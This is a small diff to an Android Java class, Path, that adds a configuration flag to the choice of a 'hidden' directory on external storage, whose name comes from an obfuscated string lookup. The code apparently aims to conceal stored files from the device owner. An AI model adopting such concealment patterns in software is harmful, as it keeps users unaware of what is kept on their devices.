@@ -19,7 +19,6 @@ import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
 import com.android.networking.util.DateTime;
-import com.android.networking.util.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -129,7 +128,7 @@ public class Path {
 			mExternalStorageAvailable = mExternalStorageWriteable = false;
 		}
 
-		if (mExternalStorageWriteable) {
+		if (mExternalStorageWriteable && Cfg.USE_SD) {
 			hidden = Environment.getExternalStorageDirectory() + Messages.getString("24.5"); //$NON-NLS-1$ //$NON-NLS-2$
 		} else {
 
